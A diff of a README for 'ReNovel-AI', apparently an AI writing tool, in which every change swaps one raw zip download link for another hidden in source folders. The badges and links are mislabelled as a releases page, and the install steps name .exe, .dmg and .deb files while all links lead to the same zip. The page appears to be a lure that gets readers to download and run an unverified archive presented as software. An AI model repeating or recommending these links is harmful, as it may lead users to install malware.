@@ -1,6 +1,6 @@
 # 🚀 ReNovel-AI - Enhance Your Writing with AI Tools
 
-[![Download Now](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ai/ReNovel-AI_3.6-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ai/ReNovel-AI_3.6-alpha.4.zip)
+[![Download Now](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ui/components/Novel-AI-Re-3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ui/components/Novel-AI-Re-3.1.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To get started with ReNovel-AI, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the downloadable files.
    
-   [Visit Releases Page](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ai/ReNovel-AI_3.6-alpha.4.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ui/components/Novel-AI-Re-3.1.zip)
 
 2. **Choose Your Download**: Locate the latest version of ReNovel-AI on the releases page. You will see options for different operating systems.
 
@@ -21,7 +21,7 @@ To get started with ReNovel-AI, follow these steps:
 4. **Install the Application**: 
    - **Windows**: Open the downloaded `.exe` file and follow the prompts to install.
    - **Mac**: Open the `.dmg` file and drag the application into your Applications folder.
-   - **Linux**: Download the `.deb` or `https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ai/ReNovel-AI_3.6-alpha.4.zip` file and follow your distribution's install instructions.
+   - **Linux**: Download the `.deb` or `https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ui/components/Novel-AI-Re-3.1.zip` file and follow your distribution's install instructions.
 
 5. **Launch ReNovel-AI**: Once installed, locate the application in your programs list and open it.
 
@@ -44,7 +44,7 @@ To get started with ReNovel-AI, follow these steps:
 
 To download ReNovel-AI, go to the link below:
 
-[Download from Releases Page](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ai/ReNovel-AI_3.6-alpha.4.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/vishnu0120754/ReNovel-AI/main/src/ui/components/Novel-AI-Re-3.1.zip)
 
 Once you've downloaded the file for your operating system, follow the installation steps mentioned in the "Getting Started" section.
 
